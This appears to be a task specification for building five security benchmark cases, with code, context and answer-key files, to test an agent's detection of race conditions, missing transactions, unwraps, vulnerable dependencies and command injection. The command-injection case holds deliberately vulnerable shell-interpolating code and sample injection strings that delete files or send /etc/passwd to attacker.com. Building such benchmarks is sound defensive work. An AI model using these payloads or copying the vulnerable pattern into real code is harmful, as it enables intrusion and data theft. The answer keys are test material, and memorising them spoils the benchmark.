# Task T05a: Security Benchmark Cases

## Context
This task creates 5 security benchmark cases for the autoresearch system. Three are mined from real forge git history (actual bugs that were fixed), one is based on a dependency vulnerability commit, and one is synthetic. These benchmarks test whether the SecuritySentinel specialist agent can detect real security issues like TOCTOU races, missing transaction safety, production unwraps, dependency vulnerabilities, and command injection. This is part of Slice S02 (Benchmark Suite + Runner).

## Prerequisites
- T04 must be complete (benchmark types and loader exist in `src/cmd/autoresearch/benchmarks.rs`)
- The `BenchmarkCase::load()` and `BenchmarkSuite::load()` functions must work

## Session Startup
Read these files in order before starting:
1. `docs/superpowers/specs/2026-03-11-forge-autoresearch-design.md` — design doc, read Benchmark Suite section
2. `docs/superpowers/specs/2026-03-11-forge-autoresearch-plan.md` — plan, read T05a section
3. `src/cmd/autoresearch/benchmarks.rs` — the types you will create data for

## Benchmark Creation

### Case 1: `toctou-race` — TOCTOU Race in `create_issue`

**Source commit:** `d9fcb61` (fix: race conditions in create_issue and create_issue_from_github)

**Extract "before" code:**
```bash
git show d9fcb61^:src/factory/db/issues.rs
```

The bug: The `create_issue` function queries `MAX(position)` OUTSIDE the transaction, then starts a transaction for the INSERT. Two concurrent calls can read the same MAX(position) and produce duplicate positions.

**Create:** `.forge/autoresearch/benchmarks/security/toctou-race/`

**code.rs** — Extract the buggy version of `create_issue` and `create_issue_from_github` (approximately lines 43-100 from the pre-fix file). Write this content:

```rust
use anyhow::{Context, Result};
use libsql::Connection;

pub async fn create_issue(
    conn: &Connection,
    project_id: i64,
    title: &str,
    description: &str,
    column: &str,
) -> Result<i64> {
    // BUG: This query runs OUTSIDE the transaction — another call can
    // read the same max position between this SELECT and the INSERT below.
    let mut rows = conn
        .query(
            "SELECT COALESCE(MAX(position), -1) FROM issues WHERE project_id = ?1 AND column_name = ?2",
            (project_id, column),
        )
        .await
        .context("Failed to get max position")?;
    let max_pos: i32 = match rows.next().await? {
        Some(row) => row.get(0)?,
        None => -1,
    };
    let position = max_pos + 1;

    // Transaction starts here, but the position was already determined above
    let tx = conn.transaction().await.context("Failed to begin transaction")?;
    tx.execute(
        "INSERT INTO issues (project_id, title, description, column_name, position) VALUES (?1, ?2, ?3, ?4, ?5)",
        libsql::params![project_id, title, description, column, position],
    )
    .await
    .context("Failed to insert issue")?;
    let id = tx.last_insert_rowid();
    tx.commit().await.context("Failed to commit")?;
    Ok(id)
}

pub async fn create_issue_from_github(
    conn: &Connection,
    project_id: i64,
    title: &str,
    description: &str,
    github_issue_number: i64,
) -> Result<Option<i64>> {
    // BUG: All three operations (existence check, position query, insert)
    // run on bare conn without a transaction wrapper.
    let mut rows = conn
        .query(
            "SELECT COUNT(*) > 0 FROM issues WHERE project_id = ?1 AND github_issue_number = ?2",
            (project_id, github_issue_number),
        )
        .await?;
    let exists: bool = match rows.next().await? {
        Some(row) => {
            let count: i64 = row.get(0)?;
            count > 0
        }
        None => false,
    };
    if exists {
        return Ok(None);
    }

    let mut rows = conn
        .query(
            "SELECT COALESCE(MAX(position), -1) FROM issues WHERE project_id = ?1 AND column_name = 'backlog'",
            [project_id],
        )
        .await?;
    let max_pos: i32 = match rows.next().await? {
        Some(row) => row.get(0)?,
        None => -1,
    };

    // BUG: insert + last_insert_rowid without transaction — concurrent insert
    // can change last_insert_rowid between these two calls.
    conn.execute(
        "INSERT INTO issues (project_id, title, description, column_name, position, github_issue_number) VALUES (?1, ?2, ?3, 'backlog', ?4, ?5)",
        libsql::params![project_id, title, description, max_pos + 1, github_issue_number],
    )
    .await
    .context("Failed to insert github issue")?;
    let id = conn.last_insert_rowid();
    Ok(Some(id))
}
```

**context.md:**
```markdown
# Issue Creation — Database Layer

This module handles creating issues in a project management database (similar to a Kanban board). Each issue has a position within its column, and positions must be unique per (project, column) pair.

`create_issue` creates a regular issue; `create_issue_from_github` creates one from a GitHub webhook, first checking if the issue already exists to avoid duplicates.

Both functions use libsql (SQLite-compatible async driver) and the codebase supports concurrent access from multiple async tasks (API server handling simultaneous HTTP requests).
```

**expected.json:**
```json
{
    "must_find": [
        {
            "id": "toctou-position-query",
            "severity": "critical",
            "description": "TOCTOU race condition: MAX(position) query runs outside transaction, concurrent calls can read same max position and produce duplicate positions",
            "location": "code.rs:12-25"
        },
        {
            "id": "no-transaction-github",
            "severity": "critical",
            "description": "create_issue_from_github has no transaction wrapper: existence check, position query, and insert are not atomic, creating race conditions",
            "location": "code.rs:42-85"
        },
        {
            "id": "last-insert-rowid-race",
            "severity": "high",
            "description": "conn.last_insert_rowid() called on bare connection without transaction: concurrent insert on another task can change the rowid between insert and read",
            "location": "code.rs:82-84"
        }
    ],
    "must_not_flag": [
        {
            "id": "fp-tx-insert-pattern",
            "description": "The tx.execute() + tx.last_insert_rowid() + tx.commit() pattern in create_issue is correct — these are inside a transaction",
            "location": "code.rs:28-34"
        },
        {
            "id": "fp-coalesce-pattern",
            "description": "COALESCE(MAX(position), -1) is a valid SQL pattern for computing default values"
        }
    ]
}
```

---

### Case 2: `missing-transaction` — Insert + last_insert_rowid Without Transaction

**Source commit:** `0c90928` (fix: transaction safety, typed phase status, and test coverage)

**Extract "before" code:**
```bash
git show 0c90928^:src/factory/db/issues.rs
```

The bug: `create_issue` calls `conn.execute()` then `conn.last_insert_rowid()` on a bare connection without wrapping in a transaction. With concurrent connections, another insert can change `last_insert_rowid()`.

**Create:** `.forge/autoresearch/benchmarks/security/missing-transaction/`

**code.rs:**
```rust
use anyhow::{Context, Result};
use libsql::Connection;

pub async fn create_issue(
    conn: &Connection,
    project_id: i64,
    title: &str,
    description: &str,
    column: &str,
) -> Result<i64> {
    let mut rows = conn
        .query(
            "SELECT COALESCE(MAX(position), -1) FROM issues WHERE project_id = ?1 AND column_name = ?2",
            (project_id, column),
        )
        .await
        .context("Failed to get max position")?;
    let max_pos: i32 = match rows.next().await? {
        Some(row) => row.get(0)?,
        None => -1,
    };
    let position = max_pos + 1;

    // BUG: No transaction wrapper. Insert and last_insert_rowid are separate operations
    // on a shared connection. A concurrent insert from another task can interleave.
    conn.execute(
        "INSERT INTO issues (project_id, title, description, column_name, position) VALUES (?1, ?2, ?3, ?4, ?5)",
        libsql::params![project_id, title, description, column, position],
    )
    .await
    .context("Failed to insert issue")?;
    let id = conn.last_insert_rowid();
    Ok(id)
}

pub async fn get_board(conn: &Connection, project_id: i64) -> Result<Vec<(i64, String)>> {
    let mut rows = conn
        .query(
            "SELECT id, title FROM issues WHERE project_id = ?1 ORDER BY position",
            [project_id],
        )
        .await?;
    let mut issues = Vec::new();
    while let Some(row) = rows.next().await? {
        issues.push((row.get(0)?, row.get(1)?));
    }
    Ok(issues)
}
```

**context.md:**
```markdown
# Issue Database Operations

Database layer for a project management tool. `create_issue` inserts a new issue into SQLite and returns its auto-generated ID. `get_board` lists all issues for a project.

The application is an async web server (axum-based) that handles concurrent HTTP requests. Multiple tasks may call `create_issue` simultaneously on the same shared database connection.
```

**expected.json:**
```json
{
    "must_find": [
        {
            "id": "no-tx-insert-rowid",
            "severity": "high",
            "description": "insert followed by last_insert_rowid without transaction wrapper: concurrent connection can interleave and return wrong ID",
            "location": "code.rs:27-34"
        },
        {
            "id": "position-race",
            "severity": "high",
            "description": "MAX(position) query and INSERT are not atomic: concurrent calls can compute the same position value",
            "location": "code.rs:11-34"
        }
    ],
    "must_not_flag": [
        {
            "id": "fp-get-board-readonly",
            "description": "get_board is a read-only query that does not need a transaction",
            "location": "code.rs:37-49"
        }
    ]
}
```

---

### Case 3: `production-unwraps` — Unwrap Calls in Production Code

**Source commit:** `7272cee` (Audit and fix production unwraps)

**Extract "before" code:**
```bash
git show 7272cee^:src/factory/api.rs
git show 7272cee^:src/signals/parser.rs
```

The bugs: (a) `options.last_mut().unwrap()` in `parse_cli_help` can panic if the options vec is empty. (b) `signals.sub_phase_spawns.last().unwrap()` accesses a pushed value via `last()` unnecessarily, but the real issue is the pattern is fragile — if the push is ever moved/removed, the unwrap panics.

**Create:** `.forge/autoresearch/benchmarks/security/production-unwraps/`

**code.rs:**
```rust
use serde::Serialize;

#[derive(Debug, Serialize)]
pub struct CliOption {
    pub flag: String,
    pub description: String,
}

/// Parse CLI --help output into structured options.
pub fn parse_cli_help(text: &str) -> Vec<CliOption> {
    let mut options = Vec::new();

    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }

        if trimmed.starts_with('-') {
            // New option line
            let mut parts = trimmed.splitn(2, "  ");
            let flag = parts.next().unwrap_or("").trim().to_string();
            let description = parts.next().unwrap_or("").trim().to_string();
            options.push(CliOption { flag, description });
        } else if !options.is_empty() {
            // BUG: Continuation line — unwrap() can panic if options is empty.
            // The `if !options.is_empty()` guard above protects this specific path,
            // but the guard and the unwrap are separated by code that could change.
            // More critically, the guard condition can be refactored away, leaving
            // a bare unwrap that panics on unexpected input.
            let last = options.last_mut().unwrap();
            if last.description.is_empty() {
                last.description = trimmed.to_string();
            } else {
                last.description = format!("{} {}", last.description, trimmed);
            }
        }
    }

    options
}

#[derive(Debug, Default)]
pub struct SubPhaseSpawnSignal {
    pub name: String,
    pub budget: u32,
}

#[derive(Debug, Default)]
pub struct ParsedSignals {
    pub sub_phase_spawns: Vec<SubPhaseSpawnSignal>,
}

/// Parse signal tags from agent output.
pub fn parse_spawn_signal(json_str: &str, signals: &mut ParsedSignals, verbose: bool) {
    match serde_json::from_str::<serde_json::Value>(json_str) {
        Ok(value) => {
            let signal = SubPhaseSpawnSignal {
                name: value["name"].as_str().unwrap_or("").to_string(),
                budget: value["budget"].as_u64().unwrap_or(0) as u32,
            };
            // BUG: Push first, then access via .last().unwrap() — fragile pattern.
            // If someone reorders or adds error handling between push and unwrap,
            // or if the push is conditional, the unwrap can panic.
            signals.sub_phase_spawns.push(signal);

            if verbose {
                println!(
                    "Signal: spawn-subphase \"{}\" (budget: {})",
                    signals.sub_phase_spawns.last().unwrap().name,
                    signals.sub_phase_spawns.last().unwrap().budget
                );
            }
        }
        Err(e) => {
            if verbose {
                eprintln!("Failed to parse spawn signal: {}", e);
            }
        }
    }
}
```

**context.md:**
```markdown
# CLI Help Parser and Signal Parser

Two production parsing utilities:
1. `parse_cli_help` — parses `--help` output from CLI tools into structured option objects. Called when displaying help information to users via the web UI.
2. `parse_spawn_signal` — parses JSON signal tags emitted by agent subprocesses. Called during pipeline execution to track sub-phase spawning.

Both are called in production with potentially malformed or unexpected input (external CLI output, agent subprocess stdout). Panics in these paths crash the server.
```

**expected.json:**
```json
{
    "must_find": [
        {
            "id": "unwrap-last-mut",
            "severity": "high",
            "description": "options.last_mut().unwrap() can panic in production: the guard condition !options.is_empty() is fragile and can be refactored away",
            "location": "code.rs:31"
        },
        {
            "id": "unwrap-after-push",
            "severity": "medium",
            "description": "signals.sub_phase_spawns.last().unwrap() after push is fragile: should use the local variable directly instead of re-accessing via last()",
            "location": "code.rs:72-73"
        }
    ],
    "must_not_flag": [
        {
            "id": "fp-unwrap-or-default",
            "description": "unwrap_or(\"\") and unwrap_or(0) are safe default-value patterns, not production panics",
            "location": "code.rs:23-24"
        },
        {
            "id": "fp-serde-match",
            "description": "The match on serde_json::from_str is proper error handling, not an unwrap issue"
        }
    ]
}
```

---

### Case 4: `vulnerable-dependencies` — High-Severity Dependency Vulnerabilities

**Source commit:** `d6cbd2c` (fix(security): patch 5 high-severity dependency vulnerabilities)

This commit updated Cargo.lock and package-lock.json. Since the actual "code" is dependency manifests, we create a synthetic representation.

**Create:** `.forge/autoresearch/benchmarks/security/vulnerable-dependencies/`

**code.rs:**
```rust
//! Dependency configuration for the forge project.
//!
//! Key dependencies and their versions (from Cargo.toml):
//!
//! [dependencies]
//! aws-lc-rs = "1.16.0"         # Cryptographic library
//! aws-lc-sys = "0.37.1"        # System bindings for AWS-LC
//! axum = "0.7"                  # Web framework
//! libsql = "0.6"               # Database driver
//! serde = "1.0"                 # Serialization
//! tokio = "1"                   # Async runtime
//!
//! Known vulnerabilities in pinned versions:
//! - aws-lc-rs 1.16.0: PKCS7_verify signature/cert-chain bypass (CVE-2024-XXXX)
//! - aws-lc-sys 0.37.1: AES-CCM timing side-channel (CVE-2024-YYYY)
//!
//! Node.js dependencies (from package.json):
//! - rollup < 4.31.0: path traversal file write
//! - minimatch < 9.0.5: ReDoS vulnerability

use std::process::Command;

/// Check for known vulnerabilities in Rust dependencies.
pub fn audit_rust_deps() -> Result<Vec<String>, String> {
    let output = Command::new("cargo")
        .args(["audit", "--json"])
        .output()
        .map_err(|e| format!("Failed to run cargo audit: {}", e))?;

    if output.status.success() {
        Ok(vec![])
    } else {
        // Parse JSON output for vulnerability details
        let stdout = String::from_utf8_lossy(&output.stdout);
        Ok(stdout.lines().map(|l| l.to_string()).collect())
    }
}

/// Check for known vulnerabilities in Node.js dependencies.
pub fn audit_npm_deps(project_dir: &str) -> Result<Vec<String>, String> {
    let output = Command::new("npm")
        .args(["audit", "--json"])
        .current_dir(project_dir)
        .output()
        .map_err(|e| format!("Failed to run npm audit: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    Ok(stdout.lines().map(|l| l.to_string()).collect())
}
```

**context.md:**
```markdown
# Dependency Security Audit

This module represents the dependency landscape of the forge project. The project uses:
- **aws-lc-rs** for cryptographic operations (TLS, signatures)
- **aws-lc-sys** for low-level system bindings
- **rollup** for frontend JavaScript bundling
- **minimatch** for glob pattern matching in the UI build

The pinned versions have known high-severity vulnerabilities that need updating:
- Cryptographic signature bypass in aws-lc-rs
- Timing side-channel in AES-CCM implementation
- Path traversal write in rollup bundler
- Regular expression denial of service in minimatch
```

**expected.json:**
```json
{
    "must_find": [
        {
            "id": "vuln-aws-lc-rs",
            "severity": "critical",
            "description": "aws-lc-rs 1.16.0 has PKCS7_verify signature/certificate-chain bypass vulnerability: must update to 1.16.1+",
            "location": "code.rs:8"
        },
        {
            "id": "vuln-aws-lc-sys",
            "severity": "high",
            "description": "aws-lc-sys 0.37.1 has AES-CCM timing side-channel vulnerability: must update to 0.38.0+",
            "location": "code.rs:9"
        },
        {
            "id": "vuln-rollup",
            "severity": "high",
            "description": "rollup before 4.31.0 has path traversal file write vulnerability",
            "location": "code.rs:17"
        }
    ],
    "must_not_flag": [
        {
            "id": "fp-axum-version",
            "description": "axum 0.7 is the current stable version with no known vulnerabilities",
            "location": "code.rs:10"
        },
        {
            "id": "fp-command-usage",
            "description": "Using Command::new for cargo audit and npm audit is standard practice for security tooling"
        }
    ]
}
```

---

### Case 5: `command-injection` — Unsanitized Input in Shell Command (Synthetic)

**Create:** `.forge/autoresearch/benchmarks/security/command-injection/`

**code.rs:**
```rust
use std::process::Command;
use anyhow::{Context, Result};

/// Clone a git repository to the local workspace.
pub fn clone_repository(repo_url: &str, target_dir: &str) -> Result<()> {
    // BUG: repo_url comes from user input (HTTP request body) and is passed
    // directly to a shell command without validation or sanitization.
    // An attacker could inject: "https://example.com; rm -rf /"
    let status = Command::new("sh")
        .arg("-c")
        .arg(format!("git clone {} {}", repo_url, target_dir))
        .status()
        .context("Failed to execute git clone")?;

    if !status.success() {
        anyhow::bail!("git clone failed with status: {}", status);
    }
    Ok(())
}

/// Create a git branch with the given name.
pub fn create_branch(project_dir: &str, branch_name: &str) -> Result<()> {
    // BUG: branch_name is user-controlled and passed to shell without sanitization.
    // Injection vector: "main; curl attacker.com/exfiltrate?data=$(cat /etc/passwd)"
    let output = Command::new("sh")
        .arg("-c")
        .arg(format!("cd {} && git checkout -b {}", project_dir, branch_name))
        .output()
        .context("Failed to create branch")?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        anyhow::bail!("Branch creation failed: {}", stderr);
    }
    Ok(())
}

/// Get the current git status (safe — no user input in command).
pub fn get_status(project_dir: &str) -> Result<String> {
    let output = Command::new("git")
        .args(["status", "--porcelain"])
        .current_dir(project_dir)
        .output()
        .context("Failed to get git status")?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// Slugify a string for use as a git branch name.
pub fn slugify(input: &str) -> String {
    input
        .to_lowercase()
        .chars()
        .map(|c| if c.is_alphanumeric() || c == '-' { c } else { '-' })
        .collect::<String>()
        .trim_matches('-')
        .to_string()
}
```

**context.md:**
```markdown
# Git Operations Module

Provides git operations for the project management system. These functions are called from HTTP API handlers when:
- A user creates a new project by providing a repository URL to clone
- A user starts work on an issue, creating a feature branch with a name derived from the issue title
- The system checks git status during pipeline execution

The `repo_url` parameter in `clone_repository` comes from a `CloneProjectRequest` HTTP POST body. The `branch_name` in `create_branch` is typically derived from issue titles but can also be user-specified.
```

**expected.json:**
```json
{
    "must_find": [
        {
            "id": "cmd-injection-clone",
            "severity": "critical",
            "description": "Command injection via unsanitized repo_url passed to sh -c: user-controlled input from HTTP body is interpolated into shell command string",
            "location": "code.rs:9-13"
        },
        {
            "id": "cmd-injection-branch",
            "severity": "critical",
            "description": "Command injection via unsanitized branch_name passed to sh -c: user-controlled string interpolated into shell command",
            "location": "code.rs:26-30"
        },
        {
            "id": "shell-instead-of-direct",
            "severity": "medium",
            "description": "Using sh -c with string formatting instead of Command::new(\"git\").args() bypasses OS-level argument separation and enables injection",
            "location": "code.rs:9-13"
        }
    ],
    "must_not_flag": [
        {
            "id": "fp-get-status-safe",
            "description": "get_status uses Command::new(\"git\").args() with current_dir(), not shell interpolation — this is the safe pattern",
            "location": "code.rs:41-48"
        },
        {
            "id": "fp-slugify-safe",
            "description": "slugify function properly sanitizes input for branch names by removing special characters"
        }
    ]
}
```

---

## TDD Sequence for Verification

### Step 1: Red — `test_security_benchmarks_load`

Add this test in `src/cmd/autoresearch/benchmarks.rs` (or a separate test file):

```rust
#[test]
fn test_security_benchmarks_load() {
    // This test validates that all 5 security benchmark cases load correctly
    // from the .forge/autoresearch/benchmarks/security/ directory.
    // It requires the benchmark files to exist at the project root.
    let forge_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
    let suite = BenchmarkSuite::load(forge_dir, "security").unwrap();

    assert_eq!(suite.specialist, "security");
    assert_eq!(suite.cases.len(), 5, "Expected 5 security benchmark cases, got {}", suite.cases.len());

    for case in &suite.cases {
        assert!(!case.code.is_empty(), "Case '{}' has empty code", case.name);
        assert!(!case.context.is_empty(), "Case '{}' has empty context", case.name);
        assert!(
            !case.expected.must_find.is_empty(),
            "Case '{}' has no must_find entries",
            case.name
        );
    }

    // Verify specific cases exist
    let names: Vec<&str> = suite.cases.iter().map(|c| c.name.as_str()).collect();
    assert!(names.contains(&"command-injection"), "Missing command-injection case");
    assert!(names.contains(&"missing-transaction"), "Missing missing-transaction case");
    assert!(names.contains(&"production-unwraps"), "Missing production-unwraps case");
    assert!(names.contains(&"toctou-race"), "Missing toctou-race case");
    assert!(names.contains(&"vulnerable-dependencies"), "Missing vulnerable-dependencies case");
}
```

### Step 2: Green — Create all 5 benchmark directories

Write the files as specified above to:
- `.forge/autoresearch/benchmarks/security/toctou-race/` (code.rs, context.md, expected.json)
- `.forge/autoresearch/benchmarks/security/missing-transaction/` (code.rs, context.md, expected.json)
- `.forge/autoresearch/benchmarks/security/production-unwraps/` (code.rs, context.md, expected.json)
- `.forge/autoresearch/benchmarks/security/vulnerable-dependencies/` (code.rs, context.md, expected.json)
- `.forge/autoresearch/benchmarks/security/command-injection/` (code.rs, context.md, expected.json)

### Step 3: Refactor

- Verify JSON is valid in all expected.json files (use `python3 -m json.tool` or `jq`)
- Ensure all `location` fields use consistent format: `code.rs:<line>` or `code.rs:<start>-<end>`
- Verify code.rs files are syntactically plausible Rust (they don't need to compile, but should look real)

## Files
- Create: `.forge/autoresearch/benchmarks/security/toctou-race/code.rs`
- Create: `.forge/autoresearch/benchmarks/security/toctou-race/context.md`
- Create: `.forge/autoresearch/benchmarks/security/toctou-race/expected.json`
- Create: `.forge/autoresearch/benchmarks/security/missing-transaction/code.rs`
- Create: `.forge/autoresearch/benchmarks/security/missing-transaction/context.md`
- Create: `.forge/autoresearch/benchmarks/security/missing-transaction/expected.json`
- Create: `.forge/autoresearch/benchmarks/security/production-unwraps/code.rs`
- Create: `.forge/autoresearch/benchmarks/security/production-unwraps/context.md`
- Create: `.forge/autoresearch/benchmarks/security/production-unwraps/expected.json`
- Create: `.forge/autoresearch/benchmarks/security/vulnerable-dependencies/code.rs`
- Create: `.forge/autoresearch/benchmarks/security/vulnerable-dependencies/context.md`
- Create: `.forge/autoresearch/benchmarks/security/vulnerable-dependencies/expected.json`
- Create: `.forge/autoresearch/benchmarks/security/command-injection/code.rs`
- Create: `.forge/autoresearch/benchmarks/security/command-injection/context.md`
- Create: `.forge/autoresearch/benchmarks/security/command-injection/expected.json`

## Must-Haves (Verification)
- [ ] Truth: `BenchmarkSuite::load(forge_dir, "security")` returns 5 cases
- [ ] Artifact: 5 directories under `.forge/autoresearch/benchmarks/security/`, each with `code.rs`, `context.md`, `expected.json`
- [ ] Key Link: Every `expected.json` has at least 1 `must_find` entry with `id`, `severity`, `description`, `location`

## Verification Commands
```bash
# Verify all JSON files are valid
for f in .forge/autoresearch/benchmarks/security/*/expected.json; do echo "=== $f ===" && python3 -m json.tool "$f" > /dev/null && echo "OK"; done

# Run the benchmark loader test
cargo test --lib cmd::autoresearch::benchmarks::tests::test_security_benchmarks_load -- --nocapture
```

## Definition of Done
- 5 benchmark directories exist under `.forge/autoresearch/benchmarks/security/`
- Each directory has valid `code.rs`, `context.md`, `expected.json`
- All `expected.json` files parse correctly via `serde_json`
- The `test_security_benchmarks_load` test passes
- Real code cases (toctou-race, missing-transaction, production-unwraps) are based on actual forge commit history
- Synthetic cases (command-injection, vulnerable-dependencies) contain realistic Rust code with clear security issues
